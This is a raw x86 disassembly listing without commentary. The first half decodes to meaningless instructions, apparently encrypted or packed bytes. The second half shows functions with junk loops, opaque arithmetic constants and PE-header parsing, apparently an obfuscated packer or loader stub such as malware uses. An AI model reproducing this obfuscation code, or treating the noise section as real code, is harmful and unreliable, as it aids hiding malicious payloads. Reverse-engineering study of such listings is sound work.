  413740:	and    DWORD PTR ds:0x78d6bf99,esp
  413746:	(bad)  
  413748:	add    DWORD PTR [edi-0xa38d87],0x42
  41374f:	les    edi,FWORD PTR [edx-0x22]
  413752:	pop    esi
  413753:	sbb    dl,BYTE PTR [eax]
  413755:	inc    ecx
  413756:	in     al,dx
  413757:	call   0xdb8e:0xb05405a0
  41375e:	repnz mov dh,cl
  413761:	adc    BYTE PTR [eax],ah
  413763:	push   ss
  413764:	pop    esp
  413765:	ds pop esp
  413767:	dec    edi
  413768:	mov    ecx,0x8e4d02
  41376d:	fisttp WORD PTR [esi-0x35]
  413770:	shl    bl,cl
  413772:	inc    esi
  413773:	sahf   
  413774:	adc    eax,0x87760603
  413779:	dec    edx
  41377a:	leave  
  41377b:	out    dx,al
  41377c:	pop    esp
  41377d:	leave  
  41377e:	leave  
  41377f:	je     0x41374e
  413781:	pop    edx
  413782:	add    DWORD PTR [ecx-0x6c06b27c],ecx
  413788:	mov    al,0xc7
  41378a:	(bad)  
  41378b:	test   eax,0x96ccc08
  413790:	mov    bl,ch
  413792:	add    DWORD PTR [esi],edi
  413794:	sbb    bl,ch
  413796:	inc    ebp
  413797:	mov    edi,DWORD PTR [ebp+0x53ea1275]
  41379d:	sbb    DWORD PTR [edx-0x7],eax
  4137a0:	mov    ecx,0x811f6d4a
  4137a5:	add    BYTE PTR [edi],cl
  4137a7:	sbb    al,0x90
  4137a9:	repz dec eax
  4137ab:	sub    ebp,ebp
  4137ad:	cmp    DWORD PTR [ecx],0x4f
  4137b0:	popf   
  4137b1:	rol    DWORD PTR [ebp+edx*8-0x7b730df4],cl
  4137b8:	repnz das 
  4137ba:	push   eax
  4137bb:	shl    BYTE PTR [ecx-0x80],0x63
  4137bf:	add    ebx,0x271357da
  4137c5:	aas    
  4137c6:	gs clc 
  4137c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137c9:	(bad)
  4137cd:	pop    eax
  4137ce:	xchg   edi,eax
  4137cf:	inc    ecx
  4137d0:	mov    dl,0xab
  4137d2:	add    al,BYTE PTR [ebp-0x41ffad29]
  4137d8:	mov    esi,DWORD PTR [edx-0x19]
  4137db:	adc    al,0x60
  4137dd:	mov    edx,0xd8ec9fff
  4137e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137e3:	retf   
  4137e4:	push   ds
  4137e5:	push   es
  4137e6:	retf   0x1bbd
  4137e9:	or     dl,BYTE PTR [ebp-0x44]
  4137ec:	test   eax,0xdd31fcd5
  4137f1:	icebp  
  4137f2:	ror    BYTE PTR [ecx+0x20],0x9f
  4137f6:	(bad)  
  4137f7:	fadd   QWORD PTR [esi]
  4137f9:	add    eax,0x3fd51fd6
  4137fe:	aas    
  4137ff:	cdq    
  413800:	xchg   ecx,eax
  413801:	pmaxsw mm3,QWORD PTR [ebp-0x2d83341f]
  413808:	mov    esp,0x8780f20c
  41380d:	adc    ah,ah
  41380f:	rcl    BYTE PTR [ecx-0x31],0x2c
  413813:	mov    eax,ds:0x7177c460
  413818:	in     al,dx
  413819:	clc    
  41381a:	fxch   st(1)
  41381c:	(bad)  
  41381d:	push   cs
  41381e:	sbb    eax,DWORD PTR [edi-0x5da49fe0]
  413824:	dec    edx
  413825:	push   esp
  413826:	hlt    
  413827:	cmp    BYTE PTR [eax+edx*1-0xa],dl
  41382b:	mov    edx,0x41083181
  413830:	mov    ebx,0xea214af2
  413835:	cmp    edx,DWORD PTR [eax+ebp*4-0x1acd2d69]
  41383c:	imul   edi,DWORD PTR [ecx],0x29c7d582
  413842:	gs retf 
  413844:	nop
  413845:	jge    0x4137dd
  413847:	mov    ds:0xaf0db609,eax
  41384c:	shl    BYTE PTR [edx-0x1b10cfb9],1
  413852:	and    al,0xc9
  413854:	div    ebx
  413856:	les    esi,FWORD PTR [ebx-0x4dd1bd13]
  41385c:	pop    edi
  41385d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41385e:	mov    ch,0xd8
  413860:	ror    DWORD PTR [ebx-0x4bb082f5],cl
  413866:	inc    edx
  413867:	xchg   edx,eax
  413868:	cli    
  413869:	pop    ds
  41386a:	retf   
  41386b:	mov    bh,dh
  41386d:	icebp  
  41386e:	inc    eax
  41386f:	imul   eax,DWORD PTR [eax-0x6],0xe76ce217
  413876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413877:	stc    
  413878:	xchg   al,cl
  41387a:	xchg   esi,eax
  41387b:	add    BYTE PTR [edx+0x19],dh
  41387e:	ret    0x236d
  413881:	sbb    al,0x27
  413883:	sti    
  413884:	xchg   esi,eax
  413885:	add    edi,esp
  413887:	or     esp,DWORD PTR [eax]
  413889:	fisubr DWORD PTR [esi-0x79cd422a]
  41388f:	in     al,dx
  413890:	jmp    0x61d2a99
  413895:	jmp    DWORD PTR [ebp+0x2525fe62]
  41389b:	sub    DWORD PTR [edx+0x3c],esp
  41389e:	adc    dl,BYTE PTR [ebp+edi*2+0x2]
  4138a2:	adc    eax,0x80f724e9
  4138a7:	fdivr  DWORD PTR [eax]
  4138a9:	(bad)  
  4138aa:	xor    eax,0x28fbd2a4
  4138af:	dec    eax
  4138b0:	mov    dl,0x88
  4138b2:	mov    cl,0x74
  4138b4:	es fdiv DWORD PTR es:[eax+edi*2-0x7c404b49]
  4138bd:	mov    edi,0x1f3e7bc9
  4138c2:	or     esp,DWORD PTR ss:[ebx]
  4138c5:	clc    
  4138c6:	mov    edx,0x8bb951d5
  4138cb:	pop    eax
  4138cc:	sub    al,0x95
  4138ce:	test   eax,0x88b41446
  4138d3:	(bad)  
  4138d4:	nop
  4138d5:	cld    
  4138d6:	add    eax,0xa13312ed
  4138db:	imul   ebx,DWORD PTR [edx+0x35],0xffffffe5
  4138df:	(bad)  [ebp-0x20]
  4138e2:	jecxz  0x413930
  4138e4:	xor    eax,0x296fa638
  4138e9:	jl     0x413899
  4138eb:	push   edx
  4138ec:	and    BYTE PTR [ebx+ebp*1-0x1c],ch
  4138f0:	ins    DWORD PTR es:[edi],dx
  4138f1:	add    BYTE PTR [ebx+0x6],ah
  4138f4:	in     eax,0x23
  4138f6:	int3   
  4138f7:	xchg   edi,eax
  4138f8:	mov    WORD PTR [edi-0x5711003d],ss
  4138fe:	add    eax,0x877761aa
  413903:	into   
  413904:	pop    ecx
  413905:	cmp    al,0xb7
  413907:	js     0x41388c
  413909:	test   DWORD PTR [edi],esp
  41390b:	sub    BYTE PTR [ebx-0x3b6bc3a4],al
  413911:	sub    eax,0xe726baa8
  413916:	js     0x413991
  413918:	arpl   WORD PTR [ebx],sp
  41391a:	cmp    dl,dl
  41391c:	inc    edi
  41391d:	int    0x79
  41391f:	mov    ah,0xd4
  413921:	xor    ebp,DWORD PTR [edi-0x4378a205]
  413927:	sub    al,0xee
  413929:	mov    ebx,0x90514e16
  41392e:	add    ecx,edx
  413930:	dec    ecx
  413931:	or     BYTE PTR ds:0x11b2f638,bh
  413937:	mov    ?,WORD PTR [ecx-0x12]
  41393a:	add    ah,0x7d
  41393d:	xchg   esi,eax
  41393e:	jae    0x41396f
  413940:	pop    ebx
  413941:	mov    eax,ds:0xdd34960
  413946:	mov    cl,0xfb
  413948:	jmp    0xb5a5:0xcd1f0240
  41394f:	(bad)  
  413950:	sbb    eax,0x557325a3
  413955:	jmp    0x4138d9
  413957:	pop    edx
  413958:	jmp    0xd336:0x16e9b203
  41395f:	lea    ecx,[edi-0x2cc2d98]
  413965:	xor    eax,0xc103906f
  41396a:	mov    bl,0x5b
  41396c:	js     0x41393b
  41396e:	adc    al,0x76
  413970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413971:	lahf   
  413972:	mov    dl,0xa3
  413974:	pop    ecx
  413975:	stos   DWORD PTR es:[edi],eax
  413976:	(bad)  
  413977:	enter  0xcb90,0xcd
  41397b:	pop    ss
  41397c:	call   0x4f6ef143
  413981:	call   0xbfeca7b1
  413986:	jno    0x41399b
  413988:	inc    edx
  413989:	xchg   esp,eax
  41398a:	shl    BYTE PTR [edx],cl
  41398c:	and    al,0xd2
  41398e:	jo     0x4139c4
  413990:	and    dl,BYTE PTR [ebp-0x4be9bebf]
  413996:	std    
  413997:	push   edx
  413998:	lods   eax,DWORD PTR ds:[esi]
  413999:	dec    ebx
  41399a:	repz push ebp
  41399c:	mov    dl,0x20
  41399f:	and    al,0x59
  4139a1:	mov    ecx,0x3b3f8dab
  4139a6:	inc    ecx
  4139a7:	adc    al,0xcc
  4139a9:	add    BYTE PTR [edx],al
  4139ab:	mov    ah,0xfb
  4139ad:	jnp    0x4139fa
  4139af:	xor    BYTE PTR [edx+edi*4],bh
  4139b2:	addr16 loop 0x41396b
  4139b5:	xor    edi,DWORD PTR [eax]
  4139b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139b8:	inc    ebx
  4139b9:	int    0x7d
  4139bb:	leave  
  4139bc:	sub    al,0x20
  4139be:	imul   ebx,DWORD PTR [ebp+0x2d02faef],0xffffffd2
  4139c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139c6:	data16 sahf 
  4139c8:	das    
  4139c9:	dec    DWORD PTR [ebx]
  4139cb:	cmp    esp,DWORD PTR ds:0x7f31cc27
  4139d1:	sahf   
  4139d2:	push   es
  4139d3:	fadd   QWORD PTR ds:0xda2a783e
  4139d9:	iret   
  4139da:	inc    ebp
  4139db:	and    al,0xd5
  4139dd:	rcl    DWORD PTR [edi+0x4],0x27
  4139e1:	push   cs
  4139e2:	jb     0x4139dc
  4139e4:	or     eax,0x61492597
  4139e9:	and    dl,BYTE PTR [eax+0x5f]
  4139ec:	sbb    BYTE PTR [esi],dh
  4139ee:	xchg   ebx,eax
  4139ef:	mov    eax,ds:0x30f7681e
  4139f4:	shl    BYTE PTR [edx-0x36],1
  4139f7:	inc    eax
  4139f8:	mov    ebx,0xa307e55b
  4139fd:	push   si
  4139ff:	mov    ah,BYTE PTR [ecx+0x6b]
  413a02:	mov    cl,0x2b
  413a04:	inc    esp
  413a05:	cmp    al,0x57
  413a07:	stc    
  413a08:	push   ebp
  413a09:	pop    ss
  413a0a:	xchg   BYTE PTR [eax-0x1c],ch
  413a0d:	inc    edi
  413a0e:	cmp    eax,0xa30d509
  413a13:	iret   
  413a14:	jecxz  0x4139f6
  413a16:	mov    cl,0x92
  413a18:	jle    0x413a46
  413a1a:	ins    BYTE PTR es:[edi],dx
  413a1b:	sbb    cl,BYTE PTR [eax]
  413a1d:	and    cl,BYTE PTR es:[ebp+0x78]
  413a21:	xor    ecx,DWORD PTR [edi+0x32]
  413a24:	jp     0x413a13
  413a26:	adc    DWORD PTR [edx-0x231eb048],esp
  413a2c:	adc    al,0x9b
  413a2e:	je     0x413a21
  413a30:	or     DWORD PTR [ecx-0x58],esp
  413a33:	sahf   
  413a34:	popa   
  413a35:	mov    bl,0x4
  413a37:	ds aas 
  413a39:	fistp  WORD PTR [esi]
  413a3b:	pop    ebp
  413a3c:	add    ch,BYTE PTR [ebx-0x1e]
  413a3f:	mov    edi,0xc29df0ec
  413a44:	cwde   
  413a45:	loope  0x413a1d
  413a47:	push   ebp
  413a48:	cmp    eax,0xdd7ed9ed
  413a4d:	fiadd  DWORD PTR [esi-0x501cd9ad]
  413a53:	sysret 
  413a55:	xor    eax,0xb4fbd242
  413a5a:	ret    
  413a5b:	imul   ebp,DWORD PTR ds:0x486a58b2,0xaee9eaf0
  413a65:	rcr    DWORD PTR [esi+0x187b49bb],cl
  413a6b:	test   DWORD PTR [edx],0xd5fa43e
  413a71:	call   ecx
  413a73:	dec    esp
  413a74:	mov    edx,0x7bef782b
  413a79:	ins    BYTE PTR es:[edi],dx
  413a7a:	mov    ch,0x2d
  413a7c:	xchg   esi,eax
  413a7d:	pop    ds
  413a7e:	xchg   ecx,eax
  413a7f:	ret    
  413a80:	xchg   ebp,eax
  413a81:	vhaddpd xmm7,xmm0,XMMWORD PTR [eax]
  413a85:	pop    esp
  413a86:	mov    ebp,0x5205975a
  413a8b:	mov    ebp,0xf024991b
  413a90:	or     cl,BYTE PTR [ebx+0xd]
  413a93:	in     al,dx
  413a94:	clc    
  413a95:	push   edi
  413a96:	in     al,dx
  413a97:	sbb    esi,DWORD PTR [edx-0x1a982b1b]
  413a9d:	jle    0x413a76
  413a9f:	into   
  413aa0:	jns    0x413aab
  413aa2:	dec    ebx
  413aa3:	and    al,0xf6
  413aa5:	mul    BYTE PTR [edi]
  413aa7:	(bad)  
  413aa8:	push   0x18
  413aaa:	dec    eax
  413aab:	stc    
  413aac:	dec    edx
  413aad:	dec    edx
  413aae:	mov    ds:0x357404e8,eax
  413ab3:	pop    ecx
  413ab4:	rcr    DWORD PTR [edx],0x88
  413ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ab8:	out    0x50,al
  413aba:	dec    esi
  413abb:	in     eax,dx
  413abc:	mov    ds:0x400993a5,eax
  413ac1:	rcr    edi,0x62
  413ac4:	xchg   ebp,eax
  413ac5:	xchg   esi,eax
  413ac6:	sar    DWORD PTR [esi],cl
  413ac8:	int3   
  413ac9:	mov    ecx,0xfd1dcda9
  413ace:	jge    0x413a8c
  413ad0:	pop    ds
  413ad1:	loop   0x413b4a
  413ad3:	sahf   
  413ad4:	popa   
  413ad5:	out    0xae,al
  413ad7:	in     eax,dx
  413ad8:	pop    ds
  413ad9:	dec    ebx
  413ada:	dec    edi
  413adb:	push   ebp
  413adc:	fbld   TBYTE PTR [edx]
  413ade:	jle    0x413b1b
  413ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ae1:	or     BYTE PTR [eax+0x43],dh
  413ae4:	addr16 fs xor eax,0xd0e25cda
  413aeb:	mov    ah,0xb5
  413aed:	ror    BYTE PTR [ecx],0x69
  413af0:	jl     0x413b17
  413af2:	(bad)  
  413af3:	aad    0xad
  413af5:	out    0x7,eax
  413af7:	out    dx,eax
  413af8:	push   ds
  413af9:	inc    ebp
  413afa:	pusha  
  413afb:	inc    eax
  413afc:	into   
  413afd:	push   edx
  413afe:	rcl    BYTE PTR [ebp-0x70],cl
  413b01:	arpl   WORD PTR [esp+ebx*1+0x189a198d],di
  413b08:	adc    bl,0xc0
  413b0b:	or     bl,BYTE PTR [esi+0x50]
  413b0e:	xor    al,0x3b
  413b10:	out    0xde,al
  413b12:	fcmovne st,st(6)
  413b14:	inc    edi
  413b15:	mov    ch,cl
  413b17:	loopne 0x413b63
  413b19:	adc    BYTE PTR [edi+0x32],al
  413b1c:	xlat   BYTE PTR ds:[ebx]
  413b1d:	cmp    eax,0x87a38da6
  413b22:	jne    0x413ae0
  413b24:	jmp    0x2aac57d7
  413b29:	mov    dl,0x15
  413b2b:	ret    0xef5b
  413b2e:	adc    BYTE PTR [edi+0x7716cff7],al
  413b34:	icebp  
  413b35:	xor    BYTE PTR [ecx+0x2a],bh
  413b38:	ins    BYTE PTR es:[edi],dx
  413b39:	push   ebx
  413b3a:	icebp  
  413b3b:	sbb    al,0xa1
  413b3d:	xor    DWORD PTR [edx+0x5718a0b9],ebx
  413b43:	dec    esi
  413b44:	push   ebp
  413b45:	out    0xba,eax
  413b47:	adc    ah,BYTE PTR [ecx-0x7d306415]
  413b4d:	jne    0x413adf
  413b4f:	sahf   
  413b50:	call   0x2ede:0xe46939db
  413b57:	dec    eax
  413b58:	das    
  413b59:	loope  0x413b31
  413b5b:	jns    0x413b58
  413b5d:	jo     0x413b63
  413b5f:	addr16 dec ebx
  413b61:	in     eax,0xae
  413b63:	mov    ebx,ds
  413b65:	cmp    al,0x68
  413b67:	adc    eax,0x5fd08790
  413b6c:	jle    0x413bb1
  413b6e:	push   ss
  413b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b70:	xchg   esp,eax
  413b71:	into   
  413b72:	and    esi,ecx
  413b74:	dec    ebx
  413b75:	mov    ds:0x1f4621d,al
  413b7a:	int3   
  413b7b:	mov    dl,0x36
  413b7d:	jbe    0x413b8d
  413b7f:	int3   
  413b80:	cmp    al,0x68
  413b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b83:	xchg   esp,eax
  413b84:	test   BYTE PTR [edx],ch
  413b86:	sub    ebx,DWORD PTR [eax-0x6143e4fc]
  413b8c:	mov    esi,DWORD PTR [edx]
  413b8e:	jge    0x413bb3
  413b90:	inc    edx
  413b91:	movups xmm3,XMMWORD PTR [eax-0x34]
  413b95:	and    eax,0x3b9d9ecb
  413b9a:	cmp    al,0x55
  413b9c:	mov    eax,ds:0x143dc845
  413ba1:	dec    edi
  413ba2:	jmp    DWORD PTR [eax]
  413ba4:	inc    edi
  413ba5:	xchg   ebx,eax
  413ba6:	into   
  413ba7:	bound  esp,QWORD PTR [eax+esi*2]
  413baa:	pop    eax
  413bab:	out    dx,eax
  413bac:	mov    edi,0x83e5bd68
  413bb1:	sti    
  413bb2:	push   es
  413bb3:	cmp    edx,edx
  413bb5:	xor    dh,bl
  413bb7:	test   eax,0x4cd54813
  413bbc:	jmp    0x413c18
  413bbe:	inc    BYTE PTR [edx-0x1f]
  413bc1:	mov    edx,0x3962dcc6
  413bc6:	es in  al,0x8c
  413bc9:	add    ah,BYTE PTR [esi-0x59]
  413bcc:	cld    
  413bcd:	or     al,cl
  413bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bd0:	and    edi,DWORD PTR [ecx]
  413bd2:	pop    ecx
  413bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bd4:	arpl   WORD PTR [ebp+0x7006ec88],ax
  413bda:	(bad)  
  413bdb:	fnstsw WORD PTR [ebx+0x79]
  413bde:	repz push ds
  413be0:	add    eax,0xfbe08ee3
  413be5:	lods   eax,DWORD PTR ds:[esi]
  413be6:	bnd jl 0x413c53
  413be9:	add    edx,ecx
  413beb:	adc    edi,0xffffffff
  413bee:	xor    edx,eax
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421cd2
  413c08:	mov    ds:0x421cda,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421aa2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423868
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a6e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423883
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423946
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a66
  413f9e:	mov    eax,ds:0x421a76
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ace
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c56
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239c0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
